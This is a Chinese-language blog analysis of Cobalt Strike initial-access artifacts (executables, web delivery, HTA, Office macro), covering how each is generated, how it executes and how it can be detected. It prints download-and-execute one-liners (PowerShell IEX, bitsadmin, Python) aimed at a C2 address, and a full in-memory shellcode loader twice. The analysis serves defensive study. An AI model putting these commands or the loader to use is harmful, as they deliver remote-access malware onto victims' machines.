+<h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><h3 id="Windows-Executable"><a href="#Windows-Executable" class="headerlink" title="Windows Executable"></a>Windows Executable</h3><p>Windows Executable 功能会生成一个 Windows 可执行的分阶段的Artifact，用于传送一个 payload stager。</p>
+<p>1、生成过程</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308175327111.png" alt="image-20220308175327111"></p>
+<p>该函数作用是读取resources目录下的文件，定位到1024个A的位置，然后将shellcode与数组进行异或加密等操作，最后将各种所有数据替换填入可执行文件。</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308183330964.png" alt="image-20220308183330964"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这段字符串是 EICAR（欧洲计算机防病毒研究所）开发的一种测试代码，用于测试设备的防病毒能力。一旦某个文件包含或者流量中包含这段代码，就会被大部分杀软和流量检测设备检测到并发出告警。一般使用的cobaltstrike都经过破解，所以不会在文件中出现该特征。</p>
+<p>生成的可执行文件前后的对比</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308183940229.png" alt="image-20220308183940229"></p>
+<p>2、执行过程</p>
+<p>静态分析：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308205237810.png" alt="image-20220308205237810"></p>
+<p>通过sprintf函数拼接命名管道pipe 服务端的字符串，对sub_4016D3函数创建线程。</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308214810395.png" alt="image-20220308214810395"></p>
+<p>连续跟进线程区域代码，主要是对命名管道做创建名称、连接、写入和关闭操作。</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308215035375.png" alt="image-20220308215035375"></p>
+<p>返回sub_4017A2函数，连续跟进后，申请内存，并对payload进行异或解密操作，创建线程写入到内存中，最后指向开始执行的地址。</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308215225184.png" alt="image-20220308215225184"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/112274131">命名管道</a></p>
+<p>动态调试：</p>
+<p>未写入payload前的内存区块</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308221642127.png" alt="image-20220308221642127"></p>
+<p>写入payload后的内存区块，并进行了异或解密</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308221738608.png" alt="image-20220308221738608"></p>
+<p>进入payload地址，对shellcode进行分析</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308222141599.png" alt="image-20220308222141599"></p>
+<p>步进到2008F，通过堆栈窗口可以看到LoadlibraryA的api hash 和参数wininet。判断该处为加载wininet.dll </p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309001442190.png" alt="image-20220309001442190"></p>
+<p><a target="_blank" rel="noopener" href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/beacon-jia-zai-zhi-hang-guo-cheng">参考</a></p>
+<p>3、检测过程</p>
+<p>网络：首先开始向c2 server 发起stager url 请求，在建立连接后，传输异或加密的Beacon.dll</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309123619020.png" alt="image-20220309123619020"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309123810761.png" alt="image-20220309123810761"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310135033306.png" alt="image-20220310135033306"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310135046352.png" alt="image-20220310135046352"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310135104129.png" alt="image-20220310135104129"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310135123756.png" alt="image-20220310135123756"></p>
+<p>函数导入表：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309134539601.png" alt="image-20220309134539601"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309134909937.png" alt="image-20220309134909937"></p>
+<p>API Hash：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309134629729.png" alt="image-20220309134629729"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309134711587.png" alt="image-20220309134711587"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LoadLibraryA:0x0726774c</span><br><span class="line">InternetOpenA:0xa779563a</span><br><span class="line">InternetConnectA:0xc69f8957</span><br><span class="line">HttpOpenRequestA:0x3b2e55eb</span><br><span class="line">InternetSetOptionA:0x869e4675</span><br><span class="line">HttpSendRequestA:0x7b18062d</span><br><span class="line">GetLastError:0x5de2c5aa</span><br><span class="line">GetDesktopWindow:0x315e2145</span><br><span class="line">InternetErrorDlg:0x0be057b7</span><br><span class="line">ExitProcess:0x56a2b5f0</span><br><span class="line">VirtualAlloc:0xe553a458</span><br><span class="line">InternetReadFile:0xe2899612</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection">参考</a></p>
+<p>内存：可以看到明显的pe结构</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309123409939.png" alt="image-20220309123409939"></p>
+<p>命名管道：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313035526989.png" alt="image-20220313035526989"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313035538634.png" alt="image-20220313035538634"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313035552899.png" alt="image-20220313035552899"></p>
+<h3 id="Windows-Executable-S"><a href="#Windows-Executable-S" class="headerlink" title="Windows Executable(S)"></a>Windows Executable(S)</h3><p>Windows Executable （S）功能会生成一个 Windows 可执行的无阶段的Artifact，直接和监听器连接、传输数据和命令。</p>
+<p>1、生成过程</p>
+<p>beacon的生成：</p>
+<p>选择listener和payload</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311004617110.png" alt="image-20220311004617110"></p>
+<p>选择Beacon.dll</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311004919918.png" alt="image-20220311004919918"></p>
+<p>加载完Beacon.dll后，读取c2拓展文件配置，解析参数后，对Beacon.dll进行处理</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311005204978.png" alt="image-20220311005204978"></p>
+<p>在处理的过程，会设置4096个字节，不足用随机字符填充</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311005506294.png" alt="image-20220311005506294"></p>
+<p>进行异或加密</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311005748691.png" alt="image-20220311005748691"></p>
+<p>最后读取c2拓展文件配置，解析参数后，对PE结构进行处理</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311010426316.png" alt="image-20220311010426316"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311010502443.png" alt="image-20220311010502443"></p>
+<p>loader的生成：</p>
+<p>读取beacon.dll，随机一个数值，对Beacon 进行异或加密，定位到1024个A的位置进行填充替换。</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311010851399.png" alt="image-20220311010851399"></p>
+<p>2、执行过程</p>
+<p>静态分析</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311013403021.png" alt="image-20220311013403021"></p>
+<p>创建命名管道</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311013504183.png" alt="image-20220311013504183"></p>
+<p>操作命名管道</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311013552881.png" alt="image-20220311013552881"></p>
+<p>分配内存区块，对数据进行异或解密</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311013615066.png" alt="image-20220311013615066"></p>
+<p>动态分析：</p>
+<p>创建命名管道</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311022921448.png" alt="image-20220311022921448"></p>
+<p>异或解密成功后的beacon.dll</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311015109813.png" alt="image-20220311015109813"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311015609366.png" alt="image-20220311015609366"></p>
+<p>3、检测过程</p>
+<p>异或特征：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311005748691.png" alt="image-20220311005748691"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311162955621.png" alt="image-20220311162955621"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311170012775.png" alt="image-20220311170012775"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311163601596.png" alt="image-20220311163601596"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311163624061.png" alt="image-20220311163624061"></p>
+<p>在生成beacon.dll 的时候，要依赖一些模板dll的，如果进行改造除了修改改特征外，还需要对dll进行解密、反编译和修改，再重写进行加密。</p>
+<p>网络：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311132501147.png" alt="image-20220311132501147"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311132532094.png" alt="image-20220311132532094"></p>
+<p>函数导入表：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311132155375.png" alt="image-20220311132155375"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311132108224.png" alt="image-20220311132108224"></p>
+<p>内存：把内存导出，然后加载到ida进行静态分析</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311134725377.png" alt="image-20220311134725377"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220311134806998.png" alt="image-20220311134806998"></p>
+<h3 id="Scripted-Web-Delivery-S"><a href="#Scripted-Web-Delivery-S" class="headerlink" title="Scripted Web Delivery (S)"></a>Scripted Web Delivery (S)</h3><p>scripted-web-delivery(s)会生成一个无阶段的 Beacon payload Artifact，在 cobaltstrike 的web服务器上托管，<br>并提供一个单行来下载和运行Artifact。该过程也称”无文件落地攻击”。<br>“无文件落地攻击”是指恶意程序文件不直接落地到目标系统的磁盘空间中的一种攻击手法，常用于逃避传统的安全检测机制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.200:80/a&#x27;))&quot;</span><br><span class="line">cmd.exe /c bitsadmin /transfer 4c79 http://192.168.1.200:80/b %APPDATA%\4c79.exe&amp;%APPDATA%\4c79.exe&amp;del %APPDATA%\4c79.exe</span><br><span class="line">python -c &quot;import urllib2; exec urllib2.urlopen(&#x27;http://192.168.1.200:80/c&#x27;).read();&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>1、生成过程</p>
+<p>生成攻击连接</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310003547887.png" alt="image-20220310003547887"></p>
+<p>生成托管脚本</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310023310614.png" alt="image-20220310023310614"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310023715150.png" alt="image-20220310023715150"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310024125073.png" alt="image-20220310024125073"></p>
+<p>2、分析过程</p>
+<p>访问url，即可看到脚本代码。</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310003927713.png" alt="image-20220310003927713"></p>
+<p>大概框架为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&quot;数据&quot;));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</span><br></pre></td></tr></table></figure>
+
+<p>解码内容</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310012837716.png" alt="image-20220310012837716"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Set-StrictMode -Version 2</span><br><span class="line"></span><br><span class="line">$DoIt = @&#x27;</span><br><span class="line">function func_get_proc_address &#123;</span><br><span class="line">	Param ($var_module, $var_procedure)		</span><br><span class="line">	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="line">	$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="line">	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function func_get_delegate_type &#123;</span><br><span class="line">	Param (</span><br><span class="line">		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="line">		[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="line">	$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="line">	$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="line"></span><br><span class="line">	return $var_type_builder.CreateType()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;数据&#x27;)</span><br><span class="line"></span><br><span class="line">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="line">	$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="line">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="line"></span><br><span class="line">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="line">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="line">&#x27;@</span><br><span class="line"></span><br><span class="line">If ([IntPtr]::size -eq 8) &#123;</span><br><span class="line">	start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $DoIt | wait-job | Receive-Job</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	IEX $DoIt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef">工具</a></p>
+<p>利用解码出来的powershell脚本进行异或解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;数据&#x27;)</span><br><span class="line"></span><br><span class="line">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="line">	$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="line">&#125;</span><br><span class="line">[System.IO.File]::WriteAllBytes(&quot;C:\Users\Administrator\Desktop\data.txt&quot;, $var_code)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到这是明显的pe结构</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310020124671.png" alt="image-20220310020124671"></p>
+<p>综上可以判断，cobaltstrike的无文件落地攻击方式，是在c2 server 上托管一份特定的脚本，该份特定的脚本内含已加密加码的beacon.dll，其功能是将恶意的beacon.dll加载到内存中并执行。</p>
+<p>当攻击进行时，攻击者会利用如powershell等系统特有的可执行程序发起网络连接，下载并执行该份托管的脚本。</p>
+<p>3、检测过程</p>
+<p>网络：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309210813243.png" alt="image-20220309210813243"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309210948612.png" alt="image-20220309210948612"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310125721481.png" alt="image-20220310125721481"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310125740318.png" alt="image-20220310125740318"></p>
+<p>默认拓展文件下会选择一个url片段</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310130019683.png" alt="image-20220310130019683"></p>
+<p>进程：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309210429562.png" alt="image-20220309210429562"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310025907279.png" alt="image-20220310025907279"></p>
+<p>日志：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310025843401.png" alt="image-20220310025843401"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220309205556009.png" alt="image-20220309205556009"></p>
+<p>函数导入表</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310030656658.png" alt="image-20220310030656658"></p>
+<h3 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a>HTML Application</h3><p>hta是HTML-Application缩写，直接将某个html页面保存成hta的格式。</p>
+<p>就是一个独立的应用软件，点开与网页内容并无区别，界面与VB、C++等程序语言所设计的软件界面没什么差别，显示为窗口交互界面。</p>
+<p>但是HTA虽然用HTML、JS和CSS编写，权限却比普通网页大得多，能够读写文件、操作注册表等。</p>
+<p>依赖于mshta.exe解析，而mshta.exe是系统下自带的。</p>
+<p>简单的来讲HTA是个披着web外衣的exe应用程序。</p>
+<p>cobaltstrike生成一个HTML应用hta，该应用中嵌入了一个payload stager，通过URL下载payload到目标磁盘。运行后目标主机便可以返回会话给CS服务器。</p>
+<p>1、生成过程</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310120347884.png" alt="image-20220310120347884"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310124448239.png" alt="image-20220310124448239"></p>
+<p>2、分析过程</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310130845426.png" alt="image-20220310130845426"></p>
+<p>2、分析过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -encodedcommand 数据</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/Analysis-On-CobaltStrike/image-20220310133027507.png" alt="image-20220310133027507"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&quot;数据&quot;));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/Analysis-On-CobaltStrike/image-20220310133239056.png" alt="image-20220310133239056"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Set-StrictMode -Version 2</span><br><span class="line"></span><br><span class="line">$DoIt = @&#x27;</span><br><span class="line">function func_get_proc_address &#123;</span><br><span class="line">	Param ($var_module, $var_procedure)		</span><br><span class="line">	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="line">	$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="line">	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function func_get_delegate_type &#123;</span><br><span class="line">	Param (</span><br><span class="line">		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="line">		[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="line">	$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="line">	$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="line"></span><br><span class="line">	return $var_type_builder.CreateType()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;数据&#x27;)</span><br><span class="line"></span><br><span class="line">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="line">	$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="line">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="line"></span><br><span class="line">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="line">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="line">&#x27;@</span><br><span class="line"></span><br><span class="line">If ([IntPtr]::size -eq 8) &#123;</span><br><span class="line">	start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $DoIt | wait-job | Receive-Job</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	IEX $DoIt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Analysis-On-CobaltStrike/image-20220310133539372.png" alt="image-20220310133539372"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310133746033.png" alt="image-20220310133746033"></p>
+<p>这是hta 下，经过一次网络请求获得的经过了两次加密编码后的stager payload ，它作用是到c2 server 拉取beacon.dll 回来加载到内存中执行。</p>
+<p>3、检测过程</p>
+<p>网络：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310132217596.png" alt="image-20220310132217596"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310132241082.png" alt="image-20220310132241082"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310132304499.png" alt="image-20220310132304499"></p>
+<p>进程：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310131047863.png" alt="image-20220310131047863"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310131100707.png" alt="image-20220310131100707"></p>
+<p>日志：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310130823919.png" alt="image-20220310130823919"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310130845426.png" alt="image-20220310130845426"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310131020298.png" alt="image-20220310131020298"></p>
+<h3 id="MS-Office-Macro"><a href="#MS-Office-Macro" class="headerlink" title="MS Office Macro"></a>MS Office Macro</h3><p>宏是一个批量处理程序命令，正确地运用它可以提高工作效率。微软的office软件允许用户自己编写，叫VBA的脚本来增加其灵活性，进一步扩充它的能力。</p>
+<p>1、生成过程</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310144644305.png" alt="image-20220310144644305"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310144555219.png" alt="image-20220310144555219"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310145628231.png" alt="image-20220310145628231"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310145225994.png" alt="image-20220310145225994"></p>
+<p>2、分析过程</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310153227516.png" alt="image-20220310153227516"></p>
+<p>从vba的代码上看，大概功能是创建线程和申请内存，同时通过rundll32.exe加载加密内容。</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310154440280.png" alt="image-20220310154440280"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310154545833.png" alt="image-20220310154545833"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310161433958.png" alt="image-20220310161433958"></p>
+<p>通过宏调试，获取到其加载地址，589824</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310163554491.png" alt="image-20220310163554491"></p>
+<p>589824转换后是0x9000</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310163743024.png" alt="image-20220310163743024"></p>
+<p>定位到rundll32.exe的进程，找到0x9000地址的内存信息，确定其为stager payload的信息。</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310164115060.png" alt="image-20220310164115060"></p>
+<p>dump下来该段内存信息，载入ida进行静态分析</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310165247197.png" alt="image-20220310165247197"></p>
+<p>3、检测过程</p>
+<p>网络：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310162026284.png" alt="image-20220310162026284"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310162049163.png" alt="image-20220310162049163"></p>
+<p>进程：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310162129217.png" alt="image-20220310162129217"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310162153437.png" alt="image-20220310162153437"></p>
